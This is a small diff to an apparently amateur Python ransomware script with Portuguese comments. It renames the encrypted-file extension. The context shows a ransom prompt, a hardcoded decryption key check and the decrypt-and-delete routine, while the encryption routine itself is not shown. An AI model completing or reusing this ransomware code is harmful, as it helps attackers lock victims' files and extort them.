@@ -51,7 +51,7 @@ def criptografando():
 
 def descrypt(decrypt_file):
     try:
-        for file in glob.glob('*.ransomencrypter'):
+        for file in glob.glob('*.ransomencryptador'):
             keybytes = decrypt_file.encode()
             name_file = open(file, 'rb')
             file_data = name_file.read()
@@ -75,7 +75,7 @@ if __name__ == '__main__':
         key = input('Seu PC foi criptografado :p, informe a chave  para liberar os arquivos:')
         if key == '1ab2c3e4f5g6h7i8':  # confirma se a chave de descriptografia foi colocada corretamente e entãos descriptografa
             descrypt(key)
-            for del_file in glob.glob('*.ransomencrypter'):
+            for del_file in glob.glob('*.ransomencryptador'):
                 os.remove(f'{desktop}\\{del_file}')
         else:
             print('Chave de liberação inválida.')
